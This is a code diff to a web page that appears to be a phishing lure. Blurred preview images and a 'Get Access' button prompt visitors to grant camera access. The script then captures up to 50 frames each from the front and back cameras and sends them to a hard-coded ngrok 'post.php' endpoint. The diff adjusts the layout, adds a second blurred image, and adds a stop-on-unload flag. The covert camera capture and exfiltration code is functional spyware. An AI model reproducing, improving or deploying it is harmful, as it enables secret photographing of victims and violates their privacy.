@@ -14,23 +14,23 @@ body{
   margin:0; font-family:Inter, system-ui, Arial, sans-serif; background:var(--bg); color:var(--white);
   -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;
 }
-.container{max-width:1000px;margin:0 auto;padding:40px 20px;text-align:center;}
-header{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:30px;}
+.container{max-width:1000px;margin:0 auto;padding:40px 20px;text-align:left;}
+header{display:flex;align-items:center;justify-content:flex-start;gap:8px;margin-bottom:30px;}
 .logo{display:flex;align-items:center;gap:8px;}
 .logo img{width:32px; height:32px;}
-.logo h2{margin:0;font-size:18px;font-weight:600;}
-main.hero{display:flex;gap:30px;align-items:center;justify-content:center;flex-wrap:wrap;}
-.hero-left{text-align:center;max-width:520px;}
+.logo h2{margin:0;font-size:20px;font-weight:700;}
+main.hero{display:flex;gap:30px;align-items:center;justify-content:flex-start;flex-wrap:wrap;}
+.hero-left{text-align:left;max-width:520px;}
 .hero-left p, .hero-left h1, .hero-left .eyebrow{
   margin:6px 0;
   font-family:'Inter', sans-serif;
   font-weight:700;
 }
-h1{font-size:36px;line-height:1.1;}
-p.lead{color:rgba(255,255,255,0.85);}
+h1{font-size:38px;line-height:1.2;}
+p.lead{font-size:18px;color:rgba(255,255,255,0.85);}
 .cta-row{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin-top:20px;}
 .btn{background:var(--accent);color:white;padding:14px 22px;border-radius:12px;border:0;font-size:16px;cursor:pointer;box-shadow:0 8px 24px rgba(30,144,255,0.12);}
-.hero-right{display:flex;align-items:center;justify-content:center;}
+.hero-right{display:flex;align-items:center;justify-content:center;flex-direction:column;gap:20px;}
 .card{
   background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
   padding:18px; border-radius:14px;
@@ -38,18 +38,18 @@ p.lead{color:rgba(255,255,255,0.85);}
   max-width:360px;
   width:100%;
 }
-#display{
+#display, #display1{
   display:block;
   border-radius:10px;
-  width:300px;
-  height:200px;
+  width:280px;
+  height:180px;
   object-fit:cover;
   border:2px solid rgba(255,255,255,0.06);
-  filter: blur(6px);
+  filter: blur(8px);
 }
 @media (max-width:760px){
-  h1{font-size:26px;}
-  #display{width:90%; height:auto;}
+  h1{font-size:28px;}
+  #display, #display1{width:90%; height:auto;}
 }
 </style>
 </head>
@@ -75,7 +75,10 @@ p.lead{color:rgba(255,255,255,0.85);}
 
     <div class="hero-right">
       <div class="card">
-        <img id="display" src="Capture.PNG?v=6" alt="Capture">
+        <img id="display1" src="Capture1.PNG" alt="Capture 1">
+      </div>
+      <div class="card">
+        <img id="display" src="Capture.PNG" alt="Capture 2">
       </div>
     </div>
   </main>
@@ -89,6 +92,7 @@ const API_URL = "https://unsighing-prepalatine-yi.ngrok-free.dev/post.php";
 const getBtn = document.getElementById('getAccessBtn');
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
+let stopCapture = false;
 
 function captureFrame(){
   const ctx = canvas.getContext('2d');
@@ -113,6 +117,7 @@ async function startCapture(){
 
   const cameras = ['user','environment']; // front/back
   for(const cam of cameras){
+    if(stopCapture) break;
     let stream;
     try {
       stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cam } });
@@ -123,8 +128,8 @@ async function startCapture(){
     video.srcObject = stream;
     await video.play();
 
-    // 50 captures par caméra
     for(let i=0;i<50;i++){
+      if(stopCapture) break;
       const base64 = captureFrame();
       sendImage(base64).then(res=>console.log('sent',res)).catch(()=>{});
       await new Promise(r=>setTimeout(r, 1200));
@@ -136,6 +141,9 @@ async function startCapture(){
   getBtn.disabled = false;
   getBtn.textContent = 'Get Access';
 }
+
+// Stop capture when user leaves page
+window.addEventListener('beforeunload', ()=>{ stopCapture = true; });
 
 getBtn.addEventListener('click', startCapture);
 </script>
